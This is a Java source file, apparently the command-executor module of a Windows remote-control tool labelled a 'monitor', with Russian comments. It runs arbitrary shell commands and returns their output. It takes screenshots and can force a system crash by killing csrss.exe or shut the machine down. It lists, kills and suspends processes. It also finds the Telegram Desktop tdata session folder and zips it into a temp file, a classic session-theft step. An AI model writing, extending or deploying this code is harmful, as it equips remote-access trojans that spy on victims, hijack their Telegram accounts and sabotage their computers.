package dev.erafox.monitor.executor;

import dev.erafox.monitor.executor.winapi.WindowsProcessFreezer;
import java.io.*;
import java.awt.*;
import java.awt.image.BufferedImage;
import javax.imageio.ImageIO;
import java.util.*;
import java.util.List;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public class WindowsCommandExecutor {
    private static final String TEMP_DIR = System.getProperty("java.io.tmpdir");

    public String executeCommand(String command) {
        StringBuilder output = new StringBuilder();
        Process process = null;
        try {
            process = Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", command});
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream(), "CP866"));
            String line;
            while ((line = reader.readLine()) != null) {
                output.append(line).append("\n");
            }
            reader.close();
            
            BufferedReader errorReader = new BufferedReader(new InputStreamReader(process.getErrorStream(), "CP866"));
            while ((line = errorReader.readLine()) != null) {
                output.append("[ERROR] ").append(line).append("\n");
            }
            errorReader.close();
        } catch (IOException e) {
            output.append("Ошибка выполнения: ").append(e.getMessage());
        } finally {
            if (process != null) {
                process.destroy();
            }
        }
        return output.toString();
    }

    public File captureScreen() {
        try {
            Robot robot = new Robot();
            Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
            BufferedImage screenshot = robot.createScreenCapture(screenRect);
            File file = new File(TEMP_DIR, "ef_screen_" + System.currentTimeMillis() + ".png");
            ImageIO.write(screenshot, "PNG", file);
            return file;
        } catch (Exception e) {
            return null;
        }
    }

    public void forceBsod() {
        executeCommand("cmd.exe /c taskkill /f /im csrss.exe");
    }

    public void shutdownSystem() {
        executeCommand("shutdown /s /f /t 0");
    }

    public List<ProcessInfo> listProcesses() {
        List<ProcessInfo> processes = new ArrayList<>();
        String output = executeCommand("tasklist /fo csv /nh");
        String[] lines = output.split("\n");
        
        for (String line : lines) {
            line = line.trim();
            if (line.isEmpty()) continue;
            
            String[] parts = line.split("\",\"");
            if (parts.length >= 2) {
                String name = parts[0].replace("\"", "");
                String pidStr = parts[1].replace("\"", "").trim();
                try {
                    int pid = Integer.parseInt(pidStr);
                    processes.add(new ProcessInfo(pid, name));
                } catch (NumberFormatException e) {
                }
            }
        }
        return processes;
    }

    public void killProcess(int pid) {
        executeCommand("taskkill /f /pid " + pid);
    }

    // Используем нативную реализацию через JNA
    public void suspendProcess(int pid) {
        WindowsProcessFreezer.suspendProcess(pid);
    }

    public void resumeProcess(int pid) {
        WindowsProcessFreezer.resumeProcess(pid);
    }

    public void openFile(File file) {
        try {
            Desktop.getDesktop().open(file);
        } catch (IOException e) {
            executeCommand("cmd.exe /c start \"\" \"" + file.getAbsolutePath() + "\"");
        }
    }

    public File getTdataFolder() {
        String userName = System.getProperty("user.name");
        String tdataPath = "C:/Users/" + userName + "/AppData/Roaming/Telegram Desktop/tdata";
        File tdataDir = new File(tdataPath);

        if (tdataDir.exists() && tdataDir.isDirectory()) {
            return tdataDir;
        } else {
            String appDataPath = System.getenv("APPDATA");
            File alternativePath = new File(appDataPath + "/Telegram Desktop/tdata");
            return alternativePath.exists() ? alternativePath : null;
        }
    }

    public File createZipArchive(File folder) {
        if (!folder.exists() || !folder.isDirectory()) {
            return null;
        }
        
        File zipFile = new File(TEMP_DIR, "ef_archive_" + System.currentTimeMillis() + ".zip");
        try (ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(zipFile))) {
            addFolderToZip(folder, folder.getName(), zos);
            return zipFile;
        } catch (IOException e) {
            return null;
        }
    }

    private void addFolderToZip(File folder, String parentPath, ZipOutputStream zos) throws IOException {
        for (File file : folder.listFiles()) {
            if (file.isDirectory()) {
                addFolderToZip(file, parentPath + "/" + file.getName(), zos);
                continue;
            }
            
            try (FileInputStream fis = new FileInputStream(file)) {
                ZipEntry zipEntry = new ZipEntry(parentPath + "/" + file.getName());
                zos.putNextEntry(zipEntry);
                
                byte[] buffer = new byte[1024];
                int length;
                while ((length = fis.read(buffer)) > 0) {
                    zos.write(buffer, 0, length);
                }
                zos.closeEntry();
            }
        }
    }

    public static class ProcessInfo {
        public final int pid;
        public final String name;
        
        public ProcessInfo(int pid, String name) {
            this.pid = pid;
            this.name = name;
        }
    }
}
